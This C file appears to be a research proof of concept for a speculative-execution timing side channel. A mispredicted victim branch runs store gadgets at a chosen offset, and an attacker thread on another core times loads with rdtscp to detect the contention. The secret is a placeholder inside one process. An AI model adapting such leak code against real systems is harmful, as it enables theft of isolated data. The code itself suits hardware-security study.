#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mman.h>
#include <pthread.h>

#define DATA    "DATA|"
#define SECRET  "SSSSSSSSSSSS"
#define DATA_SECRET     DATA SECRET

#define GET_PTR(mem_ptr, data_byte) (mem_ptr + (((int)data_byte)))

// Some shared data between attacker thread and set up thread
unsigned char *mem;
unsigned char data[128];
pthread_barrier_t att_vic_sync;

struct args {
	int offset;
};

/* ---- Utility Funcs ---- */
static inline __attribute__((always_inline)) uint64_t rdtscp_begin()
{
	uint64_t a, d;
	asm volatile(
			"cpuid\n\t"
			"rdtscp\n\t"
			"mov %%rdx, %0\n\t"
			"mov %%rax, %1\n\t"
			: "=r" (d), "=r" (a)
			:
			: "%rax", "%rbx", "%rcx", "%rdx");
	return (d << 32) | a;
}	

static inline __attribute__((always_inline)) uint64_t rdtscp_end()
{
	uint64_t a, d;
	asm volatile(
			"rdtscp\n\t"
			"mov %%rdx, %0\n\t"
			"mov %%rax, %1\n\t"
			"cpuid\n\t"
			: "=r" (d), "=r" (a)
			:
			: "%rax", "%rbx", "%rcx", "%rdx"
		    );
	return (d << 32) | a;
}	

static inline __attribute__((always_inline)) void clflush(void *ptr) {
    asm volatile("clflush 0(%0)\n"
                    :
                    : "c" (ptr)
                    : "rax"
                    );
}

static inline __attribute__((always_inline)) void mfence() {
    asm volatile("mfence");
}

static inline __attribute__((always_inline)) void read_gadget(char *ptr) {
	asm volatile (
		"mov %0, %%rax\n\t"
		"mov 0x0000(%%rax), %%r15\n\t"
		"mov 0x1000(%%rax), %%r15\n\t" 
		"mov 0x2000(%%rax), %%r15\n\t" 
		"mov 0x3000(%%rax), %%r15\n\t" 
		"mov 0x4000(%%rax), %%r15\n\t" 
		"mov 0x5000(%%rax), %%r15\n\t" 
		"mov 0x6000(%%rax), %%r15\n\t" 
		"mov 0x7000(%%rax), %%r15\n\t"
		"mov 0x0000(%%rax), %%r15\n\t"
		"mov 0x1000(%%rax), %%r15\n\t" 
		"mov 0x2000(%%rax), %%r15\n\t" 
		"mov 0x3000(%%rax), %%r15\n\t" 
		"mov 0x4000(%%rax), %%r15\n\t" 
		"mov 0x5000(%%rax), %%r15\n\t" 
		"mov 0x6000(%%rax), %%r15\n\t" 
		"mov 0x7000(%%rax), %%r15\n\t"
		"mov 0x0000(%%rax), %%r15\n\t"
		"mov 0x1000(%%rax), %%r15\n\t" 
		"mov 0x2000(%%rax), %%r15\n\t" 
		"mov 0x3000(%%rax), %%r15\n\t" 
		"mov 0x4000(%%rax), %%r15\n\t" 
		"mov 0x5000(%%rax), %%r15\n\t" 
		"mov 0x6000(%%rax), %%r15\n\t" 
		"mov 0x7000(%%rax), %%r15\n\t"
		"mov 0x0000(%%rax), %%r15\n\t"
		"mov 0x1000(%%rax), %%r15\n\t" 
		"mov 0x2000(%%rax), %%r15\n\t" 
		"mov 0x3000(%%rax), %%r15\n\t" 
		"mov 0x4000(%%rax), %%r15\n\t" 
		"mov 0x5000(%%rax), %%r15\n\t" 
		"mov 0x6000(%%rax), %%r15\n\t" 
		"mov 0x7000(%%rax), %%r15\n\t"
		: 
		: "r" (ptr)
		: "r15"
	);
	mfence();
}

static inline __attribute__((always_inline)) void write_gadget(char *ptr) {
	asm volatile (
		"mov %0, %%rax\n\t"
		"mov %%r14, 0x0000(%%rax)\n\t"
		"mov %%r14, 0x1000(%%rax)\n\t"
		"mov %%r14, 0x2000(%%rax)\n\t"
		"mov %%r14, 0x3000(%%rax)\n\t"
		"mov %%r14, 0x4000(%%rax)\n\t"
		"mov %%r14, 0x5000(%%rax)\n\t"
		"mov %%r14, 0x6000(%%rax)\n\t"
		"mov %%r14, 0x7000(%%rax)\n\t"
		"mov %%r14, 0x0000(%%rax)\n\t"
		"mov %%r14, 0x1000(%%rax)\n\t"
		"mov %%r14, 0x2000(%%rax)\n\t"
		"mov %%r14, 0x3000(%%rax)\n\t"
		"mov %%r14, 0x4000(%%rax)\n\t"
		"mov %%r14, 0x5000(%%rax)\n\t"
		"mov %%r14, 0x6000(%%rax)\n\t"
		"mov %%r14, 0x7000(%%rax)\n\t"
		"mov %%r14, 0x0000(%%rax)\n\t"
		"mov %%r14, 0x1000(%%rax)\n\t"
		"mov %%r14, 0x2000(%%rax)\n\t"
		"mov %%r14, 0x3000(%%rax)\n\t"
		"mov %%r14, 0x4000(%%rax)\n\t"
		"mov %%r14, 0x5000(%%rax)\n\t"
		"mov %%r14, 0x6000(%%rax)\n\t"
		"mov %%r14, 0x7000(%%rax)\n\t"
		"mov %%r14, 0x0000(%%rax)\n\t"
		"mov %%r14, 0x1000(%%rax)\n\t"
		"mov %%r14, 0x2000(%%rax)\n\t"
		"mov %%r14, 0x3000(%%rax)\n\t"
		"mov %%r14, 0x4000(%%rax)\n\t"
		"mov %%r14, 0x5000(%%rax)\n\t"
		"mov %%r14, 0x6000(%%rax)\n\t"
		"mov %%r14, 0x7000(%%rax)\n\t"
		"mov %%r14, 0x0000(%%rax)\n\t"
		"mov %%r14, 0x1000(%%rax)\n\t"
		"mov %%r14, 0x2000(%%rax)\n\t"
		"mov %%r14, 0x3000(%%rax)\n\t"
		"mov %%r14, 0x4000(%%rax)\n\t"
		"mov %%r14, 0x5000(%%rax)\n\t"
		"mov %%r14, 0x6000(%%rax)\n\t"
		"mov %%r14, 0x7000(%%rax)\n\t"
		"mov %%r14, 0x0000(%%rax)\n\t"
		"mov %%r14, 0x1000(%%rax)\n\t"
		"mov %%r14, 0x2000(%%rax)\n\t"
		"mov %%r14, 0x3000(%%rax)\n\t"
		"mov %%r14, 0x4000(%%rax)\n\t"
		"mov %%r14, 0x5000(%%rax)\n\t"
		"mov %%r14, 0x6000(%%rax)\n\t"
		"mov %%r14, 0x7000(%%rax)\n\t"
		:
		: "r" (ptr)
		: "rax"
	);
}

/* ---- Victim Thread ---- */
void *victim(void *args) {
	// Thread Setup //
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(0, &cpuset);
	pthread_t thread;
	thread = pthread_self();
	int ret = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
	if (ret != 0) {
		fprintf(stderr, "pthread_setaffinity_np() failed\n");
		exit(EXIT_FAILURE);
	}
	
	// Victim Leaking Data //
	size_t len = 10;
	int ITS = 10;
	int i;
	int offset = ((struct args *)args)->offset;
	
	while(1) {
		// Priming
		int j = 5;
		for (i = 0; i < ITS; i++) {
			if ((float)j / (float)len < 1) {
				write_gadget(GET_PTR(mem, 0x111));
			}
		}

		// Flush to increase chance of speculation
		j = 20;
		mfence();
		clflush(&len);
		mfence();
		
		// Encode via Parallel Writes (last 12 bits based off data[j])
		pthread_barrier_wait(&att_vic_sync);
		if ((float)j / (float)len < 1) {
			for (i = 0; i < ITS; i++) {
				write_gadget(GET_PTR(mem, offset));
			}
		}
	}
}

/* ---- Attacker Thread ---- */
void *attacker(void *args) {
	// Thread Setup //
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(8, &cpuset);
	pthread_t thread;
	thread = pthread_self();
	int ret = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
	if (ret != 0) {
		fprintf(stderr, "pthread_setaffinity_np() failed\n");
		exit(EXIT_FAILURE);
	}
	
	int ITS = 1000000;
	// Attacker Contending i //
	for(int i = 0; i < ITS; i++) {
		pthread_barrier_wait(&att_vic_sync);
		uint64_t start = rdtscp_begin();
		read_gadget(GET_PTR(mem, 0xFFF));
		mfence();
		uint64_t end = rdtscp_end();
			
		printf("%lu\n", end - start);
		fflush(stdout);
	}
}

int main(int argc, char **argv) {
	char err_msg[] = "Invalid arguments, proper use: [Victim Offset]\n";

	if (argc != 2) {
		printf("%s", err_msg);
		return EXIT_SUCCESS;
	}

    int vic_offset = atoi(argv[1]);
    printf("%d\n", vic_offset);

    /* ---- Set Up Window ---- */
	// Memory Space
	mem = (unsigned char *)mmap(NULL, 10 * 4096, 
			PROT_READ | PROT_WRITE,
			MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
	memset(mem, 0x80, 10 * 4096);
	
	// Secret Data To Target
	memset(data, ' ', sizeof(data));
    memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
    data[sizeof(data) / sizeof(data[0]) - 1] = '0';

	// Starting Threads
	pthread_t vic_thread, att_thread;
	struct args *arg = (struct args *)malloc(sizeof(struct args));

	pthread_barrier_init(&att_vic_sync, NULL, 2);
	
    /* ---- Attack Window ---- */	
	// Leaking Data //
	pthread_create(&att_thread, NULL, attacker, (void *)arg);
	pthread_create(&vic_thread, NULL, victim, (void *)arg);
	arg->offset = vic_offset;
	pthread_join(att_thread, NULL);
	
	// Thread Cleanup //
	pthread_cancel(vic_thread);
	pthread_cancel(att_thread);
	return EXIT_SUCCESS;
}
























